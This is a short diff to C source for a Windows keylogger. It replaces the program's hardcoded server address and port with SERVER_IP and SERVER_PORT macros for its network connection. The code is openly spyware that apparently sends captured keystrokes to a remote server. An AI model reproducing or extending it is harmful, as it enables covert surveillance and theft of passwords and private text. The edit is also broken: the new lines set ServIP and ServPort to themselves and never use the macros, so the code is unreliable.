@@ -11,6 +11,8 @@
 #include "keylogger.h"
 
 #define bzero(p, size) (void) memset((p), 0, (size))
+#define SERVER_IP "127.0.0.1"
+#define SERVER_PORT 50004
 
 int sock;
 
@@ -165,8 +167,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     struct sockaddr_in ServAddr;
     WSADATA wsaData;
 
-    char *ServIP = "192.168.100.192";
-    unsigned short ServPort = 50004;
+    char *ServIP = ServIP;
+    unsigned short ServPort = ServPort;
 
     if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
         return 1;
